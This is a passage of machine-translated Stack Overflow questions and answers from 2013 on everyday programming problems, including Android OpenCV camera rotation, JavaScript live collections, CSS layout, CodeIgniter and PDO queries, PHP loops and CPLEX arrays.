            System.arraycopy(data, 0, mFrame, 0, data.length);
            SampleViewBase.this.notify(); 
        }
        camera.addCallbackBuffer(mBuffer);
    }
}); 
```

**当表面发生变化**

```
/* Now allocate the buffer */
mBuffer = new byte[size];
/* The buffer where the current frame will be copied */
mFrame = new byte [size];
mCamera.addCallbackBuffer(mBuffer);

try {
    mCamera.setPreviewDisplay(null);
} catch (IOException e) {
    Log.e(TAG, "mCamera.setPreviewDisplay/setPreviewTexture fails: " + e);
}

[...]

/* Now we can start a preview */
mCamera.startPreview(); 
```

**运行方法**

```
public void run() {
    mThreadRun = true;
    Log.i(TAG, "Starting processing thread");
    while (mThreadRun) {
        Bitmap bmp = null;

        synchronized (this) {
            try {
                this.wait();
                bmp = processFrame(mFrame);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

        if (bmp != null) {
            Canvas canvas = mHolder.lockCanvas();
            if (canvas != null) {
                canvas.drawBitmap(bmp, (canvas.getWidth() - getFrameWidth()) / 2, 
                    (canvas.getHeight() - getFrameHeight()) / 2, null);
                mHolder.unlockCanvasAndPost(canvas);
            }
        }
    }
    Log.i(TAG, "Finishing processing thread");
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-26T21:19:15.887

我遇到了同样的问题。我没有使用 a `SurfaceView.Callback`，而是对他们的类进行了子类化`JavaCameraView`。[在此处](https://github.com/charlesmunger/OpenCVDemo/blob/master/src/edu/ucsb/ece251/charlesmunger/cvdemo/FaceMaskView.java)查看我的实时人脸检测和绘图示例。然后在处理之前根据设备的方向旋转从相机出来的矩阵是微不足道的。链接代码的相关摘录：

```
@Override
    public Mat onCameraFrame(Mat inputFrame) {
        int flipFlags = 1;
        if(display.getRotation() == Surface.ROTATION_270) {
            flipFlags = -1;
            Log.i(VIEW_LOG_TAG, "Orientation is" + getRotation());
        }
        Core.flip(inputFrame, mRgba, flipFlags);
        inputFrame.release();
    Imgproc.cvtColor(mRgba, mGray, Imgproc.COLOR_RGBA2GRAY);
        if (mAbsoluteFaceSize == 0) {
            int height = mGray.rows();
            if (Math.round(height * mRelativeFaceSize) > 0) {
                mAbsoluteFaceSize = Math.round(height * mRelativeFaceSize);
            }
        }
    } 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-28T02:12:05.790

[我使用 OpenCV 本身解决了旋转问题：在找出需要使用此代码](http://developer.android.com/reference/android/hardware/Camera.html#setDisplayOrientation%28int%29)校正多少屏幕旋转后，我将旋转矩阵应用于原始相机图像（从 YUV 转换为 RGB 之后）：

```
Point center = new Point(mFrameWidth/2, mFrameHeight/2);
Mat rotationMatrix = Imgproc.getRotationMatrix2D(center, totalRotation, 1); 
```

[...]

```
Imgproc.cvtColor(mYuv, mIntermediate, Imgproc.COLOR_YUV420sp2RGBA, 4);
Imgproc.warpAffine(mIntermediate, mRgba, rotationMatrix, 
    new Size(mFrameHeight, mFrameWidth)); 
```

另一个问题是`setPreviewDisplay(null)`在某些手机上出现空白屏幕。我从[这里](https://groups.google.com/forum/?fromgroups=#!topic/android-opencv/KVqUzyF8e3A)得到的解决方案，并借鉴了[这个](https://code.google.com/p/android/issues/detail?id=20999#c8)错误报告和[这个](https://stackoverflow.com/questions/2933882/how-to-draw-an-overlay-on-a-surfaceview-used-by-camera-on-android)SO 问题，将一个隐藏的“假” SurfaceView 传递给预览显示以使其启动，但实际上在一个覆盖的自定义视图上显示输出，我称之为相机视图。因此，在调用`setContentView()`Activity之后`onCreate()`，请坚持以下代码：

```
if (VERSION.SDK_INT < VERSION_CODES.HONEYCOMB) {
    final SurfaceView fakeView = new SurfaceView(this);
    fakeView.setLayoutParams(new LayoutParams(LayoutParams.MATCH_PARENT, LayoutParams.MATCH_PARENT));
    fakeView.setZOrderMediaOverlay(false);

    final CameraView cameraView = (CameraView) this.findViewById(R.id.cameraview); 
    cameraView.setZOrderMediaOverlay(true); 
    cameraView.fakeView = fakeView;
} 
```

然后，在设置预览显示时，使用以下代码：

```
try {
    if (VERSION.SDK_INT >= VERSION_CODES.HONEYCOMB)
        mCamera.setPreviewTexture(new SurfaceTexture(10));
    else
        mCamera.setPreviewDisplay(fakeView.getHolder());
} catch (IOException e) {
    Log.e(TAG, "mCamera.setPreviewDisplay fails: "+ e);
} 
```

如果您只是为 Honeycomb 及更高版本进行开发，只需将 setPreviewDisplay(null) 替换为`mCamera.setPreviewTexture(new SurfaceTexture(10));`并完成即可。 `setDisplayOrientation()`但是，如果你这样做仍然不起作用，所以你仍然必须使用旋转矩阵解决方案。

# python - OpenCV Python 在线程中运行 HAAR 级联检测

> ID：15562483
> 
> 赞同：1
> 
> 时间：2013-03-22T03:58:43.713
> 
> 标签：python, opencv, python-multithreading

我正在尝试在单独的线程中使用 HAAR Cascade 检测车辆。

这是我的一些代码： 主线程：

```
(isRead,cvImage)=cvCamSource.read()
lane1=Lane(cvCamSource,Lane.InflowLane)
print 'Blah Blah Blah!!' 
```

实际工作线程：

```
class Lane(Thread):
    def __init__(self,camSource,laneType):
        Thread.__init__(self)
        self.cvCam=camSource
        self.setLaneMask()

    def run(self):
        self.detectVehiclesCount()

    #Just update the Count
    def detectVehiclesCount(self):
        cascade=cv2.CascadeClassifier(self.cascadeFile)
        frameCount=0
        sumOfVehicleCounts=0
        noOfFramesAveraged=1000
        while frameCount<=noOfFramesAveraged:
            print frameCount
            #Read Image
            (isRead,cvImage)=self.cvCam.read()
            if isRead==True:
                frameCount+=1
                grayscaleImage=cv2.cvtColor(cvImage,cv.CV_BGR2GRAY)
                #Apply Lane Mask
                laneImage=np.bitwise_and(grayscaleImage,self.laneMask)
                rects = cascade.detectMultiScale(laneImage, scaleFactor=1.2, minNeighbors=4, minSize=(30,30), maxSize=(200,200))
                sumOfVehicleCounts+=len(rects)
            else:
                raise self.NoInputFromWebcam, "Can't Read From Webcam Source!"

        self.countOfVehicles=int(sumOfVehicleCounts/noOfFramesAveraged)

    #Set the Lane Mask
    def setLaneMask(self):
        (isRead,cvImage)=self.cvCam.read()

        if isRead:
            grayscaleImage=cv2.cvtColor(cvImage,cv.CV_BGR2GRAY)
            self.laneMask=self.extract_lane(grayscaleImage)
##            print 'Mask Image Created Successfully!'
        else:
            raise self.NoInputFromWebcam, "Can't Read From Webcam Source!"

    """
    Input grayscale cvImage
    Output cvImage of Mask
    'Mouse Click' to mark points, 'Space' to Preview and 'Enter' to Finalize Mask
    """
    def extract_lane(self, grayscaleImage):
        overlayImage=np.copy(grayscaleImage)
        cv2.namedWindow('preview')
        cPts=[[]]
        cv2.setMouseCallback('preview',self.on_mouse,(cPts,overlayImage,grayscaleImage))
        opacity=0.4
        while True:
            displayImage=cv2.addWeighted(overlayImage,opacity,grayscaleImage,1-opacity,0)
            cv2.imshow('preview',displayImage)
            keyPressed=cv2.waitKey(5)
            if keyPressed==27:
                break
            elif keyPressed==32:
                cv2.drawContours(overlayImage,np.array(cPts),0,255)
                maskImage=np.zeros_like(grayscaleImage)
                cv2.drawContours(maskImage,np.array(cPts),0,255,-1)
                extractedImage=np.bitwise_and(grayscaleImage,maskImage)
                cv2.imshow('extractedImage',extractedImage)
            elif keyPressed==13:
                break
        cv2.destroyAllWindows()

        return maskImage

    #Mouse Event Listener
    """Left Click to Draw, Right Click to Reset"""
    def on_mouse(self, event, x, y, flags,(cPts,overlayImage,resetImage)):
        if event==cv.CV_EVENT_LBUTTONUP:
            cPts[0].append([x,y])
            cv2.circle(overlayImage,(x,y),5,(255),-1)
            if len(cPts[0])>1:
                oldPoint=cPts[0][len(cPts[0])-2]
                cv2.line(overlayImage,(oldPoint[0],oldPoint[1]),(x,y),255)
        elif event==cv.CV_EVENT_RBUTTONUP:
            cPts[0]=[]
            overlayImage[:]=resetImage[:] 
```

发生的情况是 Detect 方法会阻塞主线程，直到它完成，然后打印“Blah Blah Blah”。我究竟做错了什么？

# javascript - 从 getElementsByClassName 迭代 HTMLCollection 时出现奇怪的行为

> ID：15562484
> 
> 赞同：15
> 
> 时间：2013-03-22T03:58:46.260
> 
> 标签：javascript, html, getelementsbyclassname, htmlcollection

我写了一个函数来改变元素的类来改变它们的属性。由于某种原因，只有部分元素发生了变化。我花了几个小时才找到解决方案，但这对我来说似乎很奇怪。也许你可以给我解释一下。

这不起作用：

```
function replace(){
  var elements = document.getElementsByClassName('classOne');

  for (var i = 0; i < elements.length; i++) {
    elements[i].className = 'classTwo';               
  }
} 
```

[见 JSFiddle](http://jsfiddle.net/UstH6/1/)：只有第二个项目受到影响；只有每隔一个红色元素将颜色变为蓝色。

所以我将`for`循环的最终表达式更改为不再增加`i`：

```
function replace(){
  var elements = document.getElementsByClassName('classOne');

  for (var i = 0; i < elements.length; i) { // Here’s the difference
    elements[i].className = 'classTwo';               
  }
} 
```

这很好用！似乎`push`被调用并且不需要增量。这是正常的吗？这与我见过的例子不同。

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2013-03-22T04:03:38.623

发生了什么是一个奇怪的副作用。当您`className`为 的每个元素重新分配时`elements`，该元素将从数组中删除！（实际上，正如@user2428118 所指出的，`elements`是一个*类似数组的对象*，而不是数组。请参阅[此线程](https://stackoverflow.com/questions/29707568/javascript-difference-between-array-and-array-like-object)以了解区别。）这是因为它不再具有`classOne`类名。当您的循环退出时（在第二种情况下），`elements`数组将为空。

您可以将循环编写为：

```
while (elements.length) {
    elements[0].className = 'classTwo'; // removes elements[0] from elements!
} 
```

在您的第一种情况下，通过递增`i`，您将跳过具有 class 的（原始）元素的一半`classOne`。

顺便说一句，很好的问题。研究得很好，很清楚。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-22T06:21:25.580

`getElementsByClassName`返回一个节点列表。NodeList 集合是实时集合，这意味着文档的修改会影响集合。[更多的](http://help.dottoro.com/ljtrjxbf.php)

* * *

## 回答 #3

> 赞同：-3
> 
> 时间：2014-12-01T14:53:57.937

或者恢复循环，从 length-1 开始，逐步下降到 0

# ruby-on-rails - 共享部分应该去哪里？

> ID：15562489
> 
> 赞同：0
> 
> 时间：2013-03-22T03:59:31.987
> 
> 标签：ruby-on-rails

如果我有多个视图，但它们应该共享相同的部分（例如页脚和广告栏），这些共享的部分应该去哪里？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-22T04:04:20.560

我会在视图中创建一个共享文件夹并将我所有的共享部分放入其中。您可以像这样调用部分：

```
<%= render 'shared/partialname' %> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T04:24:22.207

创建部分文件时，您必须在文件名前加上下划线。

像`footer inside a layout folder -> _footer.html.erb`

然后您必须使用以下语句在特定位置指定：

```
<%= render 'layout/footer' %> 
```

# html - 定位Div的

> ID：15562495
> 
> 赞同：0
> 
> 时间：2013-03-22T04:00:17.920
> 
> 标签：html, css

目前我正在使用[http://jsfiddle.net/ngZdg/](http://jsfiddle.net/ngZdg/)

最终，我试图让视差网站运行起来，但我正在努力解决初始布局问题。我正在尝试获得以下布局：

```
-------------------------------------
|                                    |
|                                    |
|           ______  ______           |
|           |       |     |          |
|           |       |     |          |
|           ______  ______           |
|                   |     |          |
|                   |     |          |
|                   ______           |
|                                    |
------------------------------------- 
```

有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T04:11:08.500

试试[这个](http://jsfiddle.net/ngZdg/16/)：

```
@charset"utf-8";
 #main {
    background-color:pink;
    width:1280px;
    height:100%;
    position:absolute;
}
#chapter1 {
    background: blue;
    width:90%;
    height:90%;
}
#chapter1_1 {
    background-color:red;
    width:100px;
    height:100px;
    left:100px;
    top:50px;
    position:absolute;    
}
#chapter1_2 {
    background-color:yellow;
    width:100px;
    height:100px;
    left:205px;
    top:50px;
    position:absolute;
}
#chapter1_3 {
    background-color:green;
    width:100px;
    height:100px;
    top:155px;
    left:205px;
    position: absolute;
} 
```

您还需要关闭`<DIV>`标签。

```
<div class="whatever" /> 
```

不正确，应该是

```
<div class="whatever"></div> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T04:12:31.857

您关闭 div 的方式并没有关闭它们。这会创建类似于您的图表的内容。

```
<div id="main">
    <div id="chapter1">
        <div id="chapter1_1"></div>
        <div id="chapter1_2"></div>
        <div id="chapter1_3"></div>
    </div>
</div> 
```

CSS：

```
html, body {
    height:100%;
    width:100%;
    margin:0;
    padding:0;
} 
#main {
    background-color:#00FF00;
    width:100%;
    height:100%;
    /*position:absolute;
    left:50%;
    margin-left:-640px;*/
}
#chapter1 {
    background: blue;
    height:100%;
    position:relative;
    width:100%
}
#chapter1_1,
#chapter1_2,
#chapter1_3 {
    height:20%;
    width:20%;
    position:absolute;
}
#chapter1_1 {
    background-color:red;
    top:10%;
    left:30%;    
}
#chapter1_2 {
    background-color:yellow;
    left:50%;
    top:10%;
}
#chapter1_3 {
    background-color:green;
    top:30%;
    left:50%;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T07:37:38.970

我已经更新了小提琴，背景是绝对的，其他 div 在定位上是相对的

```
Please refer link http://jsfiddle.net/MarmeeK/ngZdg/19/ 
```

CSS是这样的

```
@charset"utf-8";
 #main {
    background:pink;
    width:1280px;
    height:900px;
    position:absolute;
    top:0;
    left:0;
    bottom:0;
    margin:0;
    padding:0;
}
#chapter1 {
    margin:100px auto 100px auto;
    background: blue;
    height:500px;
    width:800px;
    padding:100px;
}
#chapter1_1, #chapter1_2, #chapter1_3 {
    width:200px;
    height:200px;
    position:relative;
    display:block;
    margin:0;
    padding:0;
    float:left;
}
#chapter1_1 {
    background-color:red;
    left:100px;
}
#chapter1_2 {
    background-color:yellow;
    left:100px;
}
#chapter1_3 {
    clear:both;// to clear the float to next line.
    background-color:green;
    left:300px;
} 
```

我相信这会做到的。:)

# jsp - 我想通过 jsp 在浏览器中显示一个特定的错误

> ID：15562496
> 
> 赞同：0
> 
> 时间：2013-03-22T04:00:36.953
> 
> 标签：jsp

我正在制作一个 javabean 类和 error.jsp。问题是我想在error.jsp 中显示特定的异常。所以我制作了错误变量，我希望错误出现在错误变量中，这样我就可以向用户显示....

```
package mypack;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement; 
import java.sql.ResultSet;

public class StudentBean {
    int roll, marks;
    String name, grade;
    String error;
    public String getError() {
        return error;
    }
    public void setError(String error) {
        this.error = error;
    }
    public int getMarks() {
        return marks;
    }
    public String getName() {
        return name;
    }
    public String getGrade() {
        return grade;
    }
    public int getRoll() {
        return roll;
    }
    public void setRoll(int roll) {
        this.roll = roll;
    }
    public boolean lookup() {
        try {
            Class.forName("oracle.jdbc.driver.OracleDriver");
            Connection con = DriverManager.getConnection(
                    "jdbc:oracle:thin:@localhost:1521:xe", "system", "oracle");
            PreparedStatement pst = con
                    .prepareStatement("select * from student where roll=?");
            pst.setInt(1, roll);
            ResultSet rs = pst.executeQuery();
            if (rs.next()) {
                name = rs.getString(1);
                roll = rs.getInt(2);
                marks = rs.getInt(3);
                grade = rs.getString(4);
            }
        } catch (Exception e) {
            System.out.println("Generated Exception " + e);
            error = e.getMessage();
        }
        return true;
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T04:30:24.843

尝试处理所有可能出现在您的代码中的异常，例如

```
 catch (NullPointerException e) {
            System.out.println("Generated Exception is NUllpointer" + e);
            error = e.getMessage();
}
 catch (OtherException e) {
            System.out.println("OtherException " + e);
            error = e.getMessage();
} 
```

# javascript - 谷歌地图制作模糊效果

> ID：15562502
> 
> 赞同：1
> 
> 时间：2013-03-22T04:01:17.753
> 
> 标签：javascript, html, css, google-maps

我正在使用此示例代码在 Google 地图上叠加某些内容。

```
<!DOCTYPE HTML>
<html>
  <head>
    <title>Google Map Test</title>
    <style>
      html, body {
        margin: 0;
        padding: 0;
        font-family: Helvetica, sans-serif, Arial;
      }
      .txt {
        position: absolute;
        top: 100px;
        left: 150px;
        padding: 30px 50px;
        text-align: center;
        font-size: 13px;
        font-weight: bold;
        z-index: 99;
        background-color: #fff;
        border: 1px solid #ddd;
      }
    </style>
  </head>
  <body>
    <div>
      <iframe src="http://www.apps-tube.com/ip-lookup/google-map.php?xy=14.4673541,78.8241339" scrolling="no" frameborder="no" id="gmap" style="width:746px;height:380px;"></iframe>
    </div>
    <div class="txt">Country name</div>
  </body>
</html> 
```

我得到这个结果[自动文本`blurred`]

![在此处输入图像描述](../Images/d93486a0a925f4075eae20d839cea6f3.png)

但我想要没有`blur effect`像下图这样的结果。

![在此处输入图像描述](../Images/14f18a5a5e38a5175b295c03390bdbf3.png)

请帮我消除这种模糊效果。访问[此链接](http://test.easy-digital.com/gmap/page.php)以获取示例页面。

注意：我使用的是谷歌浏览器。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T08:01:20.787

我已经在 Google Crome 浏览器中测试了你的代码，你在 iframe中调用**map.php ，**

我已经看到你调用地图的方式，它只调用图像（我的意思是它的地图图像 API，

您找到另一种使用[Google Maps API 网络服务的方法](https://developers.google.com/maps/documentation/webservices/)

参考文档并解决您的问题，

在同一个解决方案中，没有内置的方法来处理这个问题，因为数据是以预编译图像的形式出现的。

谢谢，

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-04-01T02:44:15.817

Jooxa 只是忽略这个错误。此问题仅发生在 Google 浏览器（27 或更低版本）上。

# sql - 在 CodeIgniter 中输出 SQL 查询的结果不显示

> ID：15562503
> 
> 赞同：1
> 
> 时间：2013-03-22T04:01:19.673
> 
> 标签：sql, codeigniter

我正在尝试使用 CodeIgniter 学习 MVC 方法，但我一直在尝试将 SQL 查询的结果显示到视图中。我正在使用方法绑定方式，因为我听说它在编写 SQL 查询时转义变量是安全的。

这是模型：

```
public function getuser_id()
{
    $this->db->select('id')->from('users')->where('email', $this->session->userdata('email'));
    $query = $this->db->get();
} 
```

这是控制器：

```
public function members()
{
    if ($this->session->userdata('is_logged_in'))
    {
        $data['title'] = 'Members Page';
        $this->load->model('model_users');
        $data['uid'] = $this->model_users->getuser_id();
        $this->load->view('members', $data);
    }
    else 
    {
        redirect('main/restricted');
    }
} 
```

视图就是这样`echo $uid;`。我要做的就是在屏幕上打印用户 ID。我认为问题在于`getuser_id()`功能。探查器说查询正在页面上执行，但我没有看到结果。数据肯定存在于数据库中。

任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-22T04:07:44.373

您的代码存在一些问题。

首先，不是直接在模型中访问会话。您应该在控制器中访问它，并将数据作为 getuser_id() 函数的参数传递给模型。

其次，您正在进行查询，但没有从中返回数据。为此，您需要修改以下行：

`$query = $this->db->get();`

成为以下之一，具体取决于您的偏好：

`$query = $this->db->get()->result(); //returns results as an object` `$query = $this->db->get()->result_array(); // returns results as an array`

在此处返回结果的更多信息。 [http://ellislab.com/codeigniter/user-guide/database/results.html](http://ellislab.com/codeigniter/user-guide/database/results.html)

第三，您不会将模型中的任何数据传递回控制器。您需要`return $your_data`在模型函数的末尾添加一个。

更新模型：

```
public function getuser_id($user_email)
{
    $this->db->select('id')->from('users')->where('email', $user_email);
    $query = $this->db->get()->result_array();

    return $query; // Don't forget to return your results!

} 
```

这是控制器：

```
public function members()
{
    if ($this->session->userdata('is_logged_in'))
    {
        $data['title'] = 'Members Page';
        $this->load->model('model_users');
        $user_email = $this->session->userdata('email');
        $data['uid'] = $this->model_users->getuser_id($user_email);
        $this->load->view('members', $data);
    }
    else 
    {
        redirect('main/restricted');
    }
} 
```

# php - 循环内定义的变量未在循环外定义（PHP）

> ID：15562509
> 
> 赞同：0
> 
> 时间：2013-03-22T04:02:03.647
> 
> 标签：php, loops, scope

我有一系列变量，我想检查它们是否为 0，如果是，我希望重新定义变量以等于字符串“不可用”。

为此，我编写了一个循环：

```
$indicators=array($admitted, $targeted, $cured, $defaulted, $total);

foreach($indicators as $indicator)
{   
if($indicator==0)
    {
    $indicator='Unavailable';
    }       
} 
```

这将检查数组 $indicators 中的每个变量是否等于零，如果是则重新定义它。

但是，在此循环关闭后，将使用以下变量构建一个表：

```
$table1 .= '
            <tr>
                    <td>'.$year.'</td>
                    <td>'.$targeted.'</td>
                    <td>'.$admitted.'</td>
                    <td>'.$total.'</td>
                    <td>'.$cured.'</td>
                    <td>'.$defaulted.'</td>                 
            </tr>
            '; 
```

其输出包括一些“0”术语——**它们永远不会替换字符串“不可用”。**

我使用以下代码调试了代码：

```
foreach($indicators as $indicator)
{
echo 'Before: '.$indicator;
if($indicator==0)
    {
    $indicator='Unavailable';
    }
    echo '<br />';
echo 'After :'.$indicator;
} 
```

并确认它正在重新定义变量，但重新定义并没有在循环之外应用。

我觉得这是范围的问题 - 我承认没有很好地理解。

**我的问题是：如何让循环内定义的变量应用到循环外？**

非常感谢您的想法。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-22T04:09:44.093

那是因为您所做的只是更新变量`$indicator`，而不是数组的原始元素。

有两种方法可以做到这一点。[通过引用](http://php.net/manual/en/language.references.pass.php)传递：

```
foreach($indicators as &$indicator) 
```

或手动将更改推送回数组：

```
foreach($indicators as $idx => $indicator)
{   
    if($indicator==0)
    {
        $indicators[$idx]='Unavailable';
    }       
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T04:21:38.673

您没有将更改后的值分配回数组

试试这个

```
foreach($indicators as $key=>$indicator)
{   
 if($indicator==0)
   {
  $indicator[$key]='Unavailable';
  }       
} 
```

# php - PHP：在 PDO exec 之前处理引号

> ID：15562511
> 
> 赞同：-1
> 
> 时间：2013-03-22T04:02:09.600
> 
> 标签：php, mysql, insert, pdo, simplexml

我有一个我设计的表单，我的意图是接受任何 UTF-8 内容并将其插入 MySQL 数据库。我使用 PDO 和 charset utf-8 作为连接数据库的编码。当内容包含单引号等字符时，插入查询仍然失败。在查询中使用它之前，我应该在我的输入内容上使用什么内置函数。下面是在插入数据库之前形成的示例查询

```
 INSERT INTO dbname.table 
               (input_xml) 
           VALUES 
               ('<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
            <ip_Input>
                 <ip_xml>
                    Qaiku.com – What Can We 
                    Learn From Failure?By Guest Blogger, September 11, 2012, Leave a 
                    CommentEditor's note: I think we in the tech press have the tendency to 
                    focus on the positive stories and forget about the startups that didn't live up 
                    their expectations. Our Sofanatics coverage this past week has been one of the 
                    few times we've covered abandoned projects, which is a pitty because there are a 
                    lot to learn from "failures." Below we have a long read from Eero Holmila which 
                    is one part eulogy, and another part what he's learned from the now-announced 
                    shutdown of Qaiku.com.Qaiku.com might be a familiar name for some of the 
                    readers of Arctic Startup. However, I am quite sure that the background and the 
                    rough road from high hopes to a bitter decline probably is not. I am the CEO of 
                    Rohea, a company behind a handful of quite successful Finnish websites like 
                    Kotikokki.net, Kuvake.net, Mikseri.net and of course a less successful 
                    Qaiku.com.I am going to share some lessons learned through the trip. I hope 
                    some of it might be of use, spark up ideas or if nothing else, be at least a bit 
                    entertaining. One last important disclaimer: all the opinions are my own.Now 
                    without further delay, this is the story of 
                    Qaiku.
                </ip_xml>
           </ip_Input>
              '); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T04:05:20.247

您应该使用的功能是[`PDOStatement::bindValue()`](http://php.net/manual/en/pdostatement.bindvalue.php). 在这样做之前，您还应该阅读 SQL 注入以及将 PDO 与参数化查询一起使用的正确方法。

# desire2learn - 如何使用 Valence API 创建学期或部门？

> ID：15562515
> 
> 赞同：1
> 
> 时间：2013-03-22T04:02:23.507
> 
> 标签：desire2learn

我想使用 Valence API 在 SIS 系统和 D2L 之间创建集成。在 SIS 中创建新学期或部门时，我想在 D2L 中自动创建它们，以便可以在 SIS 中创建课程模板和课程设置时实时创建它们。

我无法在 API 参考文档中找到用于创建组织单位的路由。看起来我所能做的就是重新排列组织单位结构或创建新的组织单位类型；然而，这不是我希望完成的。甚至可以使用 Valence API 创建组织单位吗？如果是这样，我使用什么路由？

附带说明一下，如果无法使用 Valence API 创建组织单位，那么通过 API 创建组织单位类型的使用场景是什么？组织单位类型对我来说似乎是一次性设置，而不是通常以任何方式自动化的东西。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T12:31:22.683

虽然在提出这个问题时，Valence Learning Framework API 没有提供 API 调用来改变“高于”课程提供级别的组织结构（即：确实存在添加/删除/修改课程提供、部分和组，但不调用添加/删除/修改部门、学期或自定义组织单位），此时（从 D2L 的学习套件 v10.2.0 开始）确实存在通过 API 操纵组织结构的路线。

API 现在提供了创建自定义组织单位和修改为组织单位分配的父级和子级的路线，以便您现在可以有效地将新的组织单位插入到现有的组织结构中。这些路由已添加到 LP 产品组件的 1.3 版 API（在 Learning Suite 10.2.0 中提供）。

此外，在 LP v1.4 API（在 Learning Suite 10.3.0 中提供）中，添加了 API 路由以直接修改现有单个组织单位的一些属性，以检索列表组织单位属性（并在列表中过滤），并找到叶节点和分离的组织单元（那些没有孩子和没有父母的）。

添加所有这些路由是为了使客户管理团队更容易编写旨在帮助管理组织结构的场外脚本和服务，就像您在此处描述的用例一样。

# javascript - 单击向上/向下时更新计数

> ID：15562517
> 
> 赞同：0
> 
> 时间：2013-03-22T04:02:40.530
> 
> 标签：javascript, jquery

当用户单击我网站上的向上或向下按钮时，我正在尝试更新计数器。目前我有这个代码：

```
$(function() {
    $('.up').on('click', function() {
        updateQuantity(1);
    });

    $('.down').on('click', function() {
        updateQuantity(-1);
    });

    function updateQuantity(value) {
        // Get the current quantity
        var count = $('.value').html();

        // Change it according to value passed
        count += value;

        // Write back to HTML
        $('.value').html(count);
    }
}); 
```

它有点工作，但是当我单击向上/向下按钮时，它似乎被`count`视为一个字符串，我最终得到这样的输出：`0111`或`0-1-1`. 如何强制 JavaScript 计算新计数而不是连接字符串？

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-22T04:05:18.493

转换为整数。

`count += value;`

并使用**将字符串转换为整数**`parseInt()`，因为`var count = $('.value').html();`这将返回 html 而不是整数值。

所以代码看起来像。

```
var count = parseInt($('.value').html());
count += value; // or count = count + value; 
```

### [`More About parseInt()`](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/parseInt)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T04:04:31.577

然后，您需要将其转换为整数。

```
 var count = parseInt($('.value').html()); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T04:04:36.007

`count`是一个字符串。您应该将其解析为整数：

```
var count = parseInt($('.value').text(), 10); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-22T04:04:54.883

JavaSCript 具有将字符串更改为数字的 Number 函数

```
var count = Number($('.value').html());

count += Number(value); 
```

请参阅此处的[Number()](http://www.w3schools.com/jsref/jsref_number.asp)函数

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-22T04:19:35.837

`**[LIVE DEMO](http://jsbin.com/ihuxiy/1/edit)**`

```
$(function() { 
    $('.up, .down').on('click', function() {
      var v = parseInt( $('.value').val(), 10 );
      $('.value').val( $(this).hasClass('up') ? v += 1 : v -= 1 );
    });
}); 
```

# c++ - 循环中变量的C++ cplex值

> ID：15562518
> 
> 赞同：0
> 
> 时间：2013-03-22T04:02:42.447
> 
> 标签：c++, linear-programming, cplex

我的程序有问题。我知道在哪里，但我不知道为什么。

这是我的代码：

```
#include <ilcplex/ilocplex.h>
ILOSTLBEGIN
using namespace std;
typedef IloArray<IloNumArray>    NumMatrix;
typedef IloArray<IloNumVarArray> NumVarMatrix;

int main() {
IloEnv env; 
IloInt i, j, k;
IloModel model(env); 
IloInt pro = 4; 
IloInt empl = 5;

IloNumArray e(env, project, 2, 2, 2, 3);
IloNumArray pr(env, project, 1000, 2000, 500, 1500);

IloNumVarArray p(env, project, 0, 1);
NumVarMatrix x(env, project);

for(k = 0; k < pro; k++) {
    x[k] = IloNumVarArray(env, empl+1, 0, 1);
}

for(k = 0; k < pro; k++) {     
    IloExpr sum_over_i(env);
    for(i = 0; i < empl; i++)
        sum_over_i += x[i][k];
    model.add(sum_over_i >= e[k] * p[k]);
    sum_over_i.end();
}

} 
```

当 pro 和 empl 的值相同或 empl 小于 pro 时，一切正常。但如果 empl 不仅仅是 pro，它就不再起作用了。

有谁知道为什么 empl 不能 > pro 吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T05:24:41.180

内部循环中 x 的索引是相反的。您应该引用 x[k][i] 而不是 x[i][k]。这两种方式都不起作用，只是只有当你有 empl > pro 时它才会崩溃，因为你正在使用 pro+1 元素而不是`pro`元素创建数组。您可以使用 IloSum 完全避免编写内部循环。

```
for(k = 0; k < pro; k++) {
    x[k] = IloNumVarArray(env, empl, 0, 1); // don't add additional elements
}

for(k = 0; k < pro; k++) {     
    model.add(IloSum(x[k]) >= e[k] * p[k]);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T04:38:15.113

我不知道 CPLEX，但我会大胆猜测：

```
NumVarMatrix x(env, project);

for(k = 0; k < pro; k++) {
    x[k] = IloNumVarArray(env, empl+1, 0, 1);
}

...

for(i = 0; i < empl; i++)
    sum_over_i += x[i][k]; 
```

因此，如果 empl > pro，看起来就像您正在阅读矩阵的底行一样。

# c# - 在所有线程处于睡眠、等待或加入时继续在 VS2010 中调试

> ID：15562519
> 
> 赞同：0
> 
> 时间：2013-03-22T04:02:46.553
> 
> 标签：c#, multithreading, visual-studio-2010, visual-studio-debugging

我有一个应用程序，其中有多个线程，并且大多数时候它们只是在等待事件发生（例如，使用 AutoResetEvent.Wait）。

